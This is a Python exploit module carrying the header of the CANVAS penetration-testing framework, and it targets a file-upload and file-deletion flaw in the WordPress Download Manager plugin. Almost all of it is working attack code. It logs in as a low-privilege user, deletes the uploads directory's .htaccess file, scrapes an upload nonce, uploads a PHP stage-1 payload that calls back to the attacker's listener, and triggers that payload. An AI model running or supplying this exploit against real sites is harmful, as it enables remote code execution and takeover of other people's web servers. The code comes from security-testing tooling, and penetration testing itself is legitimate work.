#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2014
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import socket
import time
import re
import urllib2
import cookielib
import urllib
import string
import random

if "." not in sys.path:
    sys.path.append(".")

import timeoutsocket
import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *

from canvasexploit import canvasexploit
from tcpexploit import tcpexploit
from contextlib import contextmanager
from phplistener import get_php_stage1

NAME                            = "wpdm_fileupload"
DESCRIPTION                     = "Shell upload in WordPress Download Manager"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "wpeden.com"
DOCUMENTATION["Date public"]    = "09/08/14"
DOCUMENTATION["CERT Advisory"]  = "None"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["References"]     = "https://vexatioustendencies.com/wordpress-plugin-vulnerability-dump-part-2/"
DOCUMENTATION["CVE Name"]       = "CWE-434"
DOCUMENTATION["CVE Url"]        = "https://cwe.mitre.org/data/definitions/434.html"
DOCUMENTATION["Changelog"]      = ""
DOCUMENTATION["Notes"]          = """

WordPress Download Manager (WPDM) 2.6.92 allows for authenticated users
(admin, editor, author, contributor, subscriber) to delete and upload arbitrary files.

This exploit deletes the .htaccess file in the wp-content/uploads/download-manager-files directory
in order to run the uploaded PHP callback.

This vulnerability may be present on older versions of WPDM.
"""

PROPERTY            = {}
PROPERTY["TYPE"]    = "Web Exploits"
PROPERTY["SITE"]    =  "Remote"
PROPERTY["ARCH"]    = [["Linux"]]
PROPERTY["VERSION"] = []

targets = {}


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name       = NAME
        self.debug      = False
        self.ssl        = None
        self.url        = None
        self.username   = None # This is Post-Auth
        self.password   = None
        self.hostname   = None # In the case of vhosts
        self.charSet    = string.lowercase + string.digits
        self.slideTitle = ''.join(random.sample(self.charSet*8, 8))
        self.shellFile  = ''.join(random.sample(self.charSet*8, 8))
        self.id         = None # File id of the .htaccess file
        self.nonce      = None # We need a token to upload files

    def getargs(self):
        self.getarg("ssl")
        if self.ssl != "True" or self.ssl != "true":
            self.ssl = False

        self.getarg("url")
        if "/index.php" in self.url:
            self.url.replace("/index.php", "/")
        if self.url[-1] != "/":
             self.url = self.url + "/"

        self.getarg("username")
        self.getarg("password")
        self.getarg("hostname")

        self.node = self.argsDict["passednodes"][0]

        return

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def usage(self):
        """
        We need a bit more information than just the target's IP
        """
        print "=" * 10
        print "Post-auth shell upload vulnerability in the Download Manager plugin for Wordpress"
        print "-O url:<path to wordpress>" # ex: wordpress/
        print "-O ssl:<True/False>"
        print "-O username:<username> # User must be provisioned to add new slides to the gallery"
        print "-O password:<password>"
        print "-O hostname:<hostname> # If no DNS record is present for the host, use the IP"
        print "=" * 10

    def testUrl(self):
        """
        Let's make sure the supplied host is reachable and looks like a wordpress page
        """
        # Make the request
        try:
            if self.ssl:
                testUrl = "https://" + self.hostname + self.url + "wp-login.php"
            else:
                testUrl = "http://" + self.hostname + self.url + "wp-login.php"
            self.log("[+] Checking that %s is the WordPress login page" % testUrl)
            (testResponse, testCode) = spkproxy.urlopen(testUrl,
                                       verb = "GET",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
            resData = testResponse.read()
        except IOError as e:
            self.log("[EE] Failed to connect to provided URL (%s)" % testUrl)
            self.log(e.strerror)

        # Test the results
        if testCode == -1:
            self.log("[EE] Unable to contact the server at %s" % testUrl)
        elif testCode != 200:
            self.log("[ii] Received an HTTP STATUS CODE of %d" % testCode)
            self.log("[ii] Visit %s and ensure it is the WordPress login page" % testCode)
        elif re.search("Lost your password", resData, re.IGNORECASE):
            self.log("[ii] Found the WordPress login page, proceeding")
            self.url = testUrl.replace("wp-login.php", "")
            return True
        else:
            self.log("[EE] Didn't find the expected WordPress login page, aborting")
            self.log("[ii] Visit %s and ensure it is the WordPress login page" % testUrl)

        return False

    def parseCookies(self, res, exheaders):
        """
        We have to handle cookies ourselves with spkproxy
        """
        cookie = ""
        for line in res.read().splitlines():
            if "Set-Cookie" in line:
                temp = line.split(" ")[1]
                cookie += temp + " "
        exheaders.append(("Cookie", cookie))

        return exheaders

    def logInToWordpress(self):
        """
        This is post-auth so we'll need to log in
        """
        exheaders = [("Content-Type", "application/x-www-form-urlencoded"), ("Connection", "keep-alive")]
        authString = "log=" + self.username + "&pwd=" + self.password + "&wp-submit=Log+in"
        (res, code) = spkproxy.urlopen(self.url + "wp-login.php",
                                       extraheaders = exheaders,
                                       data = authString,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
        if code == 302:
            self.log("[ii] Login successful")
            exheaders = self.parseCookies(res, exheaders)
            return exheaders
        else:
            self.log("[EE] Login failed")
            return False

    def findFileId(self, exheaders):
        """
        We have to find the file id for the .htaccess file to delete it
        """
        payload = ""
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"action\"\r\n"
        payload += "\r\nsave_wpdm_file\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"wpdmtask\"\r\n"
        payload += "\r\n%s\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"id\"\r\n"
        payload += "\r\n%s\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file[title]\"\r\n"
        payload += "\r\ntest\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file[description]\"\r\n"
        payload += "\r\n\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file[link_label]\"\r\n"
        payload += "\r\nDownload\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file[password]\"\r\n"
        payload += "\r\n\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file[quota]\"\r\n"
        payload += "\r\n\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file[download_count]\"\r\n"
        payload += "\r\n0\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file[show_counter]\"\r\n"
        payload += "\r\n0\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file[access]\"\r\n"
        payload += "\r\nguest\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file[file]\"\r\n"
        payload += "\r\n.htaccess\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"submit\"\r\n"
        payload += "\r\nSubmit\r\n"
        payload += "--576a5sdf6\r\n"

        exheaders.remove(("Content-Type", "application/x-www-form-urlencoded"))
        exheaders.append(("Content-Type", "multipart/form-data; boundary=576a5sdf6"))

        # Step one is we have to get an id, for some reason we can't set the file's name in this request
        # probably due to us not actually having uploaded a file but it'll create a new record in the DB
        (res, code) = spkproxy.urlopen(self.url + "wp-admin/admin-ajax.php",
                                       extraheaders = exheaders,
                                       data = payload % ("create", ""),
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
        if code == 200:
            data = res.read().splitlines()
            self.id = int(data[-1])
            self.log("[ii] Got file id of %d" % self.id)
        else:
            self.log("[EE] Unable to fetch file id, aborting")
            return False

        # Step two is we update our newly created DB entry to have the correct .htaccess file name
        (res, code) = spkproxy.urlopen(self.url + "wp-admin/admin-ajax.php",
                                       extraheaders = exheaders,
                                       data = payload % ("update", str(self.id)),
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)

        if code == 200:
            data = res.read()
            if re.search("updated", data, re.IGNORECASE):
                self.log("[ii] Successfully updated the file name of file id %d to .htaccess" % self.id)
                return True

        return False

    def deleteFile(self, exheaders):
        """
        Now that we have the file id with the proper file name, we can delete it
        """
        (res, code) = spkproxy.urlopen(self.url + "wp-admin/admin-ajax.php?action=delete_file&file=%d" % self.id,
                                       extraheaders = exheaders,
                                       verb = "GET",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
        if code == 200:
            data = res.read().splitlines()
            if data[-1] == "ok":
                self.log("[ii] Deleted the .htaccess file")
                return True

        return False

    def getNonce(self, exheaders):
        """
        This form will provide us with a WP nonce that allows us to upload files, we just have to snag it
        """
        (res, code) = spkproxy.urlopen(self.url + "wp-admin/profile.php?wpdm_action=wpdm_tinymce_button",
                                       extraheaders = exheaders,
                                       verb = "GET",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
        if code == 200:
            for line in res.read().splitlines():
                ret = re.search("ajax_nonce\":\"(.+?)\"", line, re.IGNORECASE)
                if ret:
                    self.nonce = ret.groups()[0]
                    self.log("[ii] Found _ajax_nonce of %s for file_upload" % self.nonce)
                    return True

        return False

    def uploadShell(self, exheaders):
        """
        Upload a shell through our authenticated session using the found nonce
        """
        # Generate the PHP callback
        host=self.callback.ip
        port=self.callback.port
        badChars = ""

        # This is the code that'll be inserted on the remote machine, if you want a custom shell do it here
        ret = "<?php " + get_php_stage1(badChars, host, port) + " ?>"

        # Create our payload to POST
        payload = ""
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"name\"\r\n"
        payload += "\r\n%s\r\n" % self.shellFile
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"_ajax_nonce\"\r\n"
        payload += "\r\n%s\r\n" % self.nonce
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"action\"\r\n"
        payload += "\r\nfile_upload\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"async-upload\"; filename=\"%s.php\"\r\n" % self.shellFile
        payload += "Content-Type: text/plain \r\n\r\n"
        payload += "%s\r\n" % ret
        payload += "--576a5sdf6\r\n"

        # Update connection parameters
        url = self.url + "wp-admin/admin-ajax.php"
        exheaders.append(("Content-Type", "multipart/form-data; boundary=576a5sdf6"))

        # Make the POST
        (res, code) = spkproxy.urlopen(url,
                                       extraheaders = exheaders,
                                       data = payload,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
        # Check for failure
        if code == 200:
            data = res.read().splitlines()
            ret = re.search("(\d\.\d\d)", data[-1])
            if ret and ret.groups()[0] != "0.00":
                self.log("[ii] Callback upload successful")
                return True

        return False

    def trigger(self):
        """
        Visit our callback
        """
        url = self.url + "wp-content/uploads/download-manager-files/%s.php" % self.shellFile
        self.log("[+] Trying to visit %s" % url)
        (trigResp, trigCode) = spkproxy.urlopen(url, verb = "GET", hostname = self.hostname, entireresponse = True, return_response_code = True)
        if trigCode != 200:
           self.log("[ii] Received HTTP STATUS CODE of: %d"%trigCode)
           self.log("[EE] Upload failed for an unknown reason")
        else:
           self.log("[ii] Upload succeeded")
           return True

        return False

    def run(self):
        self.getargs()

        # This is awful and ugly and gross and I feel bad about writing it
        if self.testUrl():
            exheaders = self.logInToWordpress()
            if (exheaders
                and self.findFileId(exheaders)
                and self.deleteFile(exheaders)
                and self.getNonce(exheaders)
                ):

                if self.uploadShell(exheaders):
                    if self.trigger():
                        return True

        return False


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
